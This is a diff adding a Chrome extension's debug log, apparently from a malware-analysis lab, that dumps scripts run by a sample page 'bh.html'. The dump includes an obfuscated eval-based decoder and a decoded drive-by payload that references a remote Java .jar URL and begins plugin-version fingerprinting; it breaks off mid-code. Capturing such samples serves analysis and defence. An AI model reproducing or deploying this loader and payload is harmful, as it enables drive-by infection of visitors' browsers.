@@ -1,0 +1,47 @@
+service-worker.js:21 Script ID: {buildId: '', embedderName: 'file:///home/paul/tmp/chromium-lab/extensions/get-js-source/Examples/bh.html', endColumn: 52097, endLine: 0, executionContextAuxData: {…}, …}buildId: ""embedderName: "file:///home/paul/tmp/chromium-lab/extensions/get-js-source/Examples/bh.html"endColumn: 52097endLine: 0executionContextAuxData: {frameId: '3F3C7D304FE347C0A2CA975476973D3D', isDefault: true, type: 'default'}executionContextId: 9hasSourceURL: falsehash: "2cb685228498e2a9c5504946cebda39151ed1183a4a24c9a0b801edda3572b57"isLiveEdit: falseisModule: falselength: 789scriptId: "30"scriptLanguage: "JavaScript"sourceMapURL: ""startColumn: 51308startLine: 0url: "file:///home/paul/tmp/chromium-lab/extensions/get-js-source/Examples/bh.html"[[Prototype]]: Object
+service-worker.js:21 Script ID: {buildId: '', embedderName: '', endColumn: 2, endLine: 3, executionContextAuxData: {…}, …}
+service-worker.js:21 Script ID: {buildId: '', embedderName: '', endColumn: 2, endLine: 3, executionContextAuxData: {…}, …}
+service-worker.js:21 Script ID: {buildId: '', embedderName: '', endColumn: 4, endLine: 0, executionContextAuxData: {…}, …}
+service-worker.js:21 Script ID: {buildId: '', embedderName: '', endColumn: 6, endLine: 0, executionContextAuxData: {…}, …}
+service-worker.js:21 Script ID: {buildId: '', embedderName: '', endColumn: 6, endLine: 0, executionContextAuxData: {…}, …}
+service-worker.js:21 Script ID: {buildId: '', embedderName: '', endColumn: 6, endLine: 0, executionContextAuxData: {…}, …}
+....
+ Script ID: {buildId: '', embedderName: '', endColumn: 6, endLine: 0, executionContextAuxData: {…}, …}
+ Script ID: {buildId: '', embedderName: '', endColumn: 6, endLine: 0, executionContextAuxData: {…}, …}
+ Script ID: {buildId: '', embedderName: '', endColumn: 6, endLine: 0, executionContextAuxData: {…}, …}
+ Script ID: {buildId: '', embedderName: '', endColumn: 6, endLine: 0, executionContextAuxData: {…}, …}
+ Script ID: {buildId: '', embedderName: '', endColumn: 6, endLine: 0, executionContextAuxData: {…}, …}
+...
+service-worker.js:21 Script ID: {buildId: '', embedderName: '', endColumn: 6, endLine: 0, executionContextAuxData: {…}, …}
+service-worker.js:21 Script ID: {buildId: '', embedderName: '', endColumn: 6, endLine: 0, executionContextAuxData: {…}, …}
+service-worker.js:21 Script ID: {buildId: '', embedderName: '', endColumn: 25574, endLine: 0, executionContextAuxData: {…}, …}
+service-worker.js:21 Script ID: {buildId: '', embedderName: '', endColumn: 2, endLine: 3, executionContextAuxData: {…}, …}
+service-worker.js:25 |  file:///home/paul/tmp/chromium-lab/extensions/get-js-source/Examples/bh.html :  ICjLu=this["document"];tlNpy="innerHTML";eTb62W=window;ICjLu.PmygJD=function(hy){return ICjLu.getElementsByName(hy);};ICjLu.dMC6ofr=function(hy){return ICjLu.getElementsByTagName(hy);};WDJYka=ICjLu.PmygJD("zizqkbO")[0]["va"+"lue"];TBrU1W=new Function("x,y,z","return x.replace(y,z)");sDmTMeL=new Function("x,y,z","return x.substr(y,z)");ATwMVY=TBrU1W("ev[object Object]al",new Object(),"");ybu2bdtD = eTb62W[ATwMVY](ATwMVY);dhQAS3=ICjLu.dMC6ofr("span")[1][tlNpy];WWFbiz = "3Be<ZVG%@kDiCY#2 .FtP|E-IyJlx\\9TS7)^1\"d$c0=zp}5>r_['Wo&g(jqHM6/sbX!aUn{AwQO4+Nf:]*;hRK?8Lumv,";RTmk2X="";TPu9srV=dhQAS3[WDJYka];ilXvUtp=0;while(ilXvUtp<TPu9srV){aWmCUT=sDmTMeL(dhQAS3,ilXvUtp+(124*0),44/22)*(45*2/90);RTmk2X=RTmk2X["concat"](sDmTMeL(WWFbiz,ybu2bdtD("aWmCUT"),1));ilXvUtp=2+ilXvUtp;}ybu2bdtD(RTmk2X);
+service-worker.js:25 |   :  (function anonymous(x,y,z
+) {
+return x.replace(y,z)
+})
+service-worker.js:25 |   :  (function anonymous(x,y,z
+) {
+return x.substr(y,z)
+})
+service-worker.js:25 |   :  eval
+service-worker.js:25 |   :  aWmCUT
+service-worker.js:25 |   :  aWmCUT
+service-worker.js:25 |   :  aWmCUT
+service-worker.js:25 |   :  aWmCUT
+service-worker.js:25 |   :  aWmCUT
+service-worker.js:25 |   :  aWmCUT
+service-worker.js:25 |   :  aWmCUT
+service-worker.js:25 |   :  aWmCUT
+service-worker.js:25 |   :  aWmCUT
+service-worker.js:25 |   :  aWmCUT
+service-worker.js:25 |   :  aWmCUT
+service-worker.js:25 |   :  aWmCUT
+service-worker.js:25 |   :  aWmCUT
+service-worker.js:25 |   :  var javafile='http://llldkkej223df.c0m.li/images/getJavaInfo.jar';var jver=[0,0,0,0],pdfver=[0,0,0,0];try{var PluginDetect={handler:function(c,b,a){return function(){c(b,a)}},isDefined:function(b){return typeof b!="undefined"},isArray:function(b){return(/array/i).test(Object.prototype.toString.call(b))},isFunc:function(b){return typeof b=="function"},isString:function(b){return typeof b=="string"},isNum:function(b){return typeof b=="number"},isStrNum:function(b){return(typeof b=="string"&&(/\d/).test(b))},getNumRegx:/[\d][\d\.\_,-]*/,splitNumRegx:/[\.\_,-]/g,getNum:function(b,c){var d=this,a=d.isStrNum(b)?(d.isDefined(c)?new RegExp(c):d.getNumRegx).exec(b):null;return a?a[0]:null},compareNums:function(h,f,d){var e=this,c,b,a,g=parseInt;if(e.isStrNum(h)&&e.isStrNum(f)){if(e.isDefined(d)&&d.compareNums){return d.compareNums(h,f)}c=h.split(e.splitNumRegx);b=f.split(e.splitNumRegx);for(a=0;a<Math.min(c.length,b.length);a++){if(g(c[a],10)>g(b[a],10)){return 1}if(g(c[a],10)<g(b[a],10)){return -1}}}return 0},formatNum:function(b,c){var d=this,a,e;if(!d.isStrNum(b)){return null}if(!d.isNum(c)){c=4}c--;e=b.replace(/\s/g,"").split(d.splitNumRegx).concat(["0","0","0","0"]);for(a=0;a<4;a++){if(/^(0+)(.+)$/.test(e[a])){e[a]=RegExp.$2}if(a>c||!(/\d/).test(e[a])){e[a]="0"}}return e.slice(0,4).join(",")},$$hasMimeType:function(a){return function(d){if(!a.isIE&&d){var c,b,e,f=a.isString(d)?[d]:d;if(!f||!f.length){return null}for(e=0;e<f.length;e++){if(/[^\s]/.test(f[e])&&(c=navigator.mimeTypes[f[e]])&&(b=c.enabledPlugin)&&(b.name||b.description)){return c}}}return null}},findNavPlugin:function(l,e,c){var j=this,h=new RegExp(l,"i"),d=(!j.isDefined(e)||e)?/\d/:0,k=c?new RegExp(c,"i"):0,a=navigator.plugins,g="",f,b,m;for(f=0;f<a.length;f++){m=a[f].description||g;b=a[f].name||g;if((h.test(m)&&(!d||d.test(RegExp.leftContext+RegExp.rightContext)))||(h.test(b)&&(!d||d.test(RegExp.leftContext+RegExp.rightContext)))){if(!k||!(k.test(m)||k.test(b))){return a[f]}}}return null},getMimeEnabledPlugin:function(a,f){var e=this,b,c=new RegExp(f,"i"),d="";if((b=e.hasMimeType(a))&&(b=b.enabledPlugin)&&(c.test(b.description||d)||c.test(b.name||d))){return b}return 0},getPluginFileVersion:function(f,b){var h=this,e,d,g,a,c=-1;if(h.OS>2||!f||!f.version||!(e=h.getNum(f.version))){return b}if(!b){return e}e=h.formatNum(e);b=h.formatNum(b);d=b.split(h.splitNumRegx);g=e.split(h.splitNumRegx);for(a=0;a<d.length;a++){if(c>-1&&a>c&&d[a]!="0"){return b}if(g[a]!=d[a]){if(c==-1){c=a}if(d[a]!="0"){return b}}}return e},AXO:window.ActiveXObject,getAXO:function(b){var f=null,d,c=this,a;try{f=new c.AXO(b)}catch(d){}return f},convertFuncs:function(g){var a,h,f,b=/^[\$][\$]/,d={},c=this;for(a in g){if(b.test(a)){d[a]=1}}for(a in d){try{h=a.slice(2);if(h.length>0&&!g[h]){g[h]=g[a](g);delete g[a]}}catch(f){}}},initScript:function(){var c=this,a=navigator,e="/",i=a.userAgent||"",g=a.vendor||"",b=a.platform||"",h=a.product||"";c.OS=100;if(b){var f,d=["Win",1,"Mac",2,"Linux",3,"FreeBSD",4,"iPhone",21.1,"iPod",21.2,"iPad",21.3,"Win.*CE",22.1,"Win.*Mobile",22.2,"Pocket\s*PC",22.3,"",100];for(f=d.length-2;f>=0;f=f-2){if(d[f]&&new RegExp(d[f],"i").test(b)){c.OS=d[f+1];break}}}c.convertFuncs(c);c.isIE=new Function("return "+e+"*@cc_on!@*"+e+"false")();c.verIE=c.isIE&&(/MSIE\s*(\d+\.?\d*)/i).test(i)?parseFloat(RegExp.$1,10):null;c.ActiveXEnabled=false;if(c.isIE){var f,j=["Msxml2.XMLHTTP","Msxml2.DOMDocument","Microsoft.XMLDOM","ShockwaveFlash.ShockwaveFlash","TDCCtl.TDCCtl","Shell.UIHelper","Scripting.Dictionary","wmplayer.ocx"];for(f=0;f<j.length;f++){if(c.getAXO(j[f])){c.ActiveXEnabled=true;break}}c.head=c.isDefined(document.getElementsByTagName)?document.getElementsByTagName("head")[0]:null}c.isGecko=(/Gecko/i).test(h)&&(/Gecko\s*\/\s*\d/i).test(i);c.verGecko=c.isGecko?c.formatNum((/rv\s*\:\s*([\.\,\d]+)/i).test(i)?RegExp.$1:"0.9"):null;c.isSafari=(/Safari\s*\/\s*\d/i).test(i)&&(/Apple/i).test(g);c.isChrome=(/Chrome\s*\/\s*(\d[\d\.]*)/i).test(i);c.verChrome=c.isChrome?c.formatNum(RegExp.$1):null;c.isOpera=(/Opera\s*[\/]?\s*(\d+\.?\d*)/i).test(i);c.verOpera=c.isOpera&&((/Version\s*\/\s*(\d+\.?\d*)/i).test(i)||1)?parseFloat(RegExp.$1,10):null;c.addWinEvent("load",c.handler(c.runWLfuncs,c))},init:function(c){var b=this,a,c;if(!b.isString(c)){return -3}if(c.length==1){b.getVersionDelimiter=c;return -3}c=c.toLowerCase().replace(/\s/g,"");a=b[c];if(!a||!a.getVersion){return -3}b.plugin=a;if(!b.isDefined(a.installed)){a.installed=a.version=a.version0=a.getVersionDone=null;a.$=b;a.pluginName=c}b.garbage=false;if(b.isIE&&!b.ActiveXEnabled){if(a!==b.java){return -2}}return 1},fPush:function(b,a){var c=this;if(c.isArray(a)&&(c.isFunc(b)||(c.isArray(b)&&b.length>0&&c.isFunc(b[0])))){a.push(b)}},callArray:function(b){var c=this,a;if(c.isArray(b)){for(a=0;a<b.length;a++){if(b[a]===null){return}c.call(b[a]);b[a]=null}}},call:function(c){var b=this,a=b.isArray(c)?c.length:-1;if(a>0&&b.isFunc(c[0])){c[0](b,a>1?c[1]:0,a>2?c[2]:0,a>3?c[3]:0)}else{if(b.isFunc(c)){c(b)}}},getVersionDelimite
+service-worker.js:25 |   :  (function anonymous(
+) {
+return /*@cc_on!@*/false
+})
+
